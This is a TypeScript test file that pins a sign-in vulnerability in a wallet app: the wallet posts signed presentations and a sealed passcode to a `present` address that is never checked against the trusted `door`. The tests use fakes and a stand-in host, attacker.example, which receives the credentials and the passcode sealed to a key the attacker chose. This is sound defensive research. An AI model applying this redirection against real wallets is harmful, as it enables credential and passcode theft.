/**
 * Security research for matou-app #694 (assessing #693): a sign-in code carries
 * `door` (the site the signature binds to and the card is drawn for) and, apart
 * from it, `present` (where the wallet posts). Nothing on the wallet side ties
 * the two together. These tests PIN TODAY'S BEHAVIOUR — they are the "proven"
 * evidence the report at docs/spikes/2026-09-signin-present-address-risk.md
 * rests on. They assert what the code does now (the gap), not a fix; a fix that
 * lands later will red them, which is the point — they mark the boundary #693
 * rules on. No behaviour under frontend/src is changed by this file.
 *
 * Everything runs against fakes: a fake signer, a fake credential export, and a
 * fake "attacker" door reached through an injected fetch. Nothing touches a live
 * community or a live sign-in site (task rule).
 */
import { describe, it, expect, vi } from 'vitest';
import { runApprove } from 'src/lib/signin/approve';
import { boundMessage, type PresentBody, type PresentVerdict } from 'src/lib/signin/present';
import { answeredByTheDoor } from 'src/lib/signin/revokedMemory';
import { runHandover, handoverKeyUrl, handoverSealUrl, type HandoverDeps } from 'src/lib/signin/handover';

/** A community sign-in site the wallet already trusts (the code's `door`). */
const TRUSTED_DOOR = 'https://id.whakatohea.idss.nz/login';
/** An address the attacker controls, on a DIFFERENT origin from the door. */
const ATTACKER_PRESENT = 'https://attacker.example/collect/present';
const AID = 'Etama';
const CHALLENGE = 'nonce-EXAMPLE';
const CRED_SAID = 'ECredentialSAID-EXAMPLE';

function json(status: number, body: unknown): Response {
  return new Response(JSON.stringify(body), { status });
}

function makeFetch(
  handler: (url: string, init: RequestInit | undefined) => Response,
): typeof fetch & { calls: { url: string; init?: RequestInit }[] } {
  const calls: { url: string; init?: RequestInit }[] = [];
  const fn = vi.fn((input: RequestInfo | URL, init?: RequestInit) => {
    const url = String(input);
    calls.push({ url, init });
    return Promise.resolve(handler(url, init));
  });
  return Object.assign(fn as unknown as typeof fetch, { calls });
}

describe('#694 — the present address is not tied to the door (present.ts / approve.ts)', () => {
  it('runApprove posts the signed presentation to `present` verbatim, though the signature binds `door`', async () => {
    let postedUrl = '';
    let postedBody: PresentBody | null = null;
    const deps = {
      sign: vi.fn(async (message: string) => `SIG(${message})`),
      exportCredential: vi.fn(async () => '-ACDC+iss-CESR-EXAMPLE'),
      present: vi.fn(async (url: string, body: PresentBody): Promise<PresentVerdict> => {
        postedUrl = url;
        postedBody = body;
        return { outcome: 'verified' };
      }),
    };

    await runApprove(
      {
        door: TRUSTED_DOOR,
        present: ATTACKER_PRESENT, // a foreign origin
        challenge: CHALLENGE,
        aid: AID,
        credentialSaid: CRED_SAID,
      },
      deps,
    );

    // PROVEN: the post goes to the attacker's address, untouched — the door's
    // origin is never compared to it.
    expect(postedUrl).toBe(ATTACKER_PRESENT);
    // PROVEN: yet the signature is bound to the REAL door — so the artifact the
    // attacker now holds verifies at the real door (replay, report Q2).
    expect(postedBody!.response).toBe(`SIG(${boundMessage(TRUSTED_DOOR, AID, CHALLENGE)})`);
    // PROVEN: the receiver holds the raw presentation (the credential + iss).
    expect(postedBody!.presentation).toBe('-ACDC+iss-CESR-EXAMPLE');
    expect(postedBody!.aid).toBe(AID);
    expect(postedBody!.challenge_id).toBe(CHALLENGE);
  });
});

describe('#694 — the origin check exists but only gates revoked memory (revokedMemory.ts)', () => {
  it('answeredByTheDoor is FALSE for a foreign present, TRUE only when origins match', () => {
    // The helper #692 added compares present-origin to door-origin. It is the
    // exact test #693 would need to gate the POST — but today it gates only
    // whether a `revoked` answer is remembered, not whether the wallet posts.
    expect(answeredByTheDoor(TRUSTED_DOOR, ATTACKER_PRESENT)).toBe(false);
    expect(answeredByTheDoor(TRUSTED_DOOR, `${TRUSTED_DOOR}/app/present`)).toBe(true);
  });
});

describe('#694 — the handover reads the sealing key from `present`, not `door` (handover.ts)', () => {
  it('derives BOTH handover routes from the (foreign) present_url', () => {
    // PROVEN: point `present` at the attacker and both handover routes follow it.
    expect(handoverKeyUrl(ATTACKER_PRESENT, CHALLENGE)).toBe(
      'https://attacker.example/collect/handover/key?c=nonce-EXAMPLE',
    );
    expect(handoverSealUrl(ATTACKER_PRESENT)).toBe('https://attacker.example/collect/handover/seal');
  });

  it('an armed handover seals the passcode to a verkey the ATTACKER chose, and posts it to the attacker', async () => {
    // The attacker's server plays the door's handover routes: it answers the key
    // poll with a verkey IT minted, and accepts the sealed box.
    const ATTACKER_VERKEY = 'DATTACKERchosenVerkeyQb64Example00000000000';
    const sealPosts: Record<string, unknown>[] = [];
    const fetchImpl = makeFetch((url, init) => {
      if (url.includes('/handover/key')) {
        return json(200, { sealing_key: ATTACKER_VERKEY });
      }
      sealPosts.push(JSON.parse(init!.body as string));
      return json(200, { status: 'answered' });
    });
    // The sealer stands in for sealPasscode: it records the verkey it was asked
    // to seal the steward's passcode to.
    const sealedTo: string[] = [];
    const deps: HandoverDeps = {
      seal: async (_challenge: string, verkey: string) => {
        sealedTo.push(verkey);
        return `cipher-to(${verkey})`;
      },
      fetchImpl,
      sleep: async () => undefined,
    };

    await runHandover(ATTACKER_PRESENT, CHALLENGE, AID, deps);

    // PROVEN (the highest-stakes finding, report Q4): the wallet sealed the
    // steward's passcode to the ATTACKER's verkey — a key the attacker can open.
    expect(sealedTo).toEqual([ATTACKER_VERKEY]);
    // PROVEN: and posted that ciphertext to the ATTACKER's seal route.
    expect(sealPosts).toHaveLength(1);
    expect(sealPosts[0]).toEqual({
      challenge_id: CHALLENGE,
      aid: AID,
      sealed_passcode: `cipher-to(${ATTACKER_VERKEY})`,
    });
    const sealCall = fetchImpl.calls.find((c) => c.url.includes('/handover/seal'));
    expect(sealCall?.url).toBe(handoverSealUrl(ATTACKER_PRESENT));
  });
});
